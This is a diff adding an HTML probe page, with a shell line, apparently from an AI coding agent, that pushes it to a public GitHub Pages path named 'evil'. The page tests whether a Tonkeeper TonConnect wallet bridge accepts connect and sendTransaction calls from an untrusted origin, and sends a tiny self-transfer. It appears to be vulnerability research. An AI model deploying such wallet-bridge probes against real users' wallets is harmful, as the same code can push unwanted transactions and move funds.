@@ -1,0 +1,23 @@
+<!doctype html><html><body style="font:14px monospace;padding:10px;background:#fff">
+<div id="s">TX-PROBE-BOOT</div><div id="t"></div>
+<script>
+var s=document.getElementById('s'),t=document.getElementById('t');
+function L(x){t.innerHTML+='<div>'+String(x).slice(0,250)+'</div>';}
+L('BOOT '+location.origin+' t='+Date.now());
+if(!(window.tonkeeper&&window.tonkeeper.tonconnect)){L('NO_BRIDGE');}
+else{
+L('HAS_BRIDGE');
+var b=window.tonkeeper.tonconnect;
+b.connect(2,{manifestUrl:'https://goodman387.github.io/evil/manifest.json',items:[{name:'ton_addr'}]}).then(function(r){
+  L('CONNECT_RESOLVED');s.textContent='TX:CONNECTED';
+  var btn=document.createElement('button');btn.textContent='SEND TRANSACTION 0.001 TON (self)';btn.style.cssText='font:20px monospace;padding:18px;width:100%;background:#f80';
+  var myid=Date.now();
+  btn.onclick=function(){ s.textContent='TX:SENT_WAIT'; L('tx id='+myid+' at '+Date.now());
+    var valid_until=Math.floor(Date.now()/1000)+600;
+    b.send({id:myid,method:'sendTransaction',params:{valid_until:valid_until,network:'-239',from_address:'UQAL5qkuAqM9Lay8-tpT9KwTQDLZ13ZnTdGVGSEoce3st6TO',messages:[{address:'UQAL5qkuAqM9Lay8-tpT9KwTQDLZ13ZnTdGVGSEoce3st6TO',amount:'1000000'}]}}).then(function(res){s.textContent='TX:SENT_NO_CONFIRM?';L('TX RES '+JSON.stringify(res).slice(0,200));},function(e){s.textContent='TX:ERR';L('TX ERR '+e);});
+  };
+  document.body.appendChild(btn);
+},function(e){L('CONNECT_REJ '+e);s.textContent='TX:CONNECT_REJ';});
+}
+</script></body></EOF>
+cd /tmp/opencode/dyn3/ghpages && git add -A && git commit -q -m "tx probe self-transfer" && git push -q origin HEAD:master 2>&1 | tail -1; echo PUSHED; sleep 40; curl -s -o /dev/null -w "%{http_code}\n" https://goodman387.github.io/evil/tx-probe.html
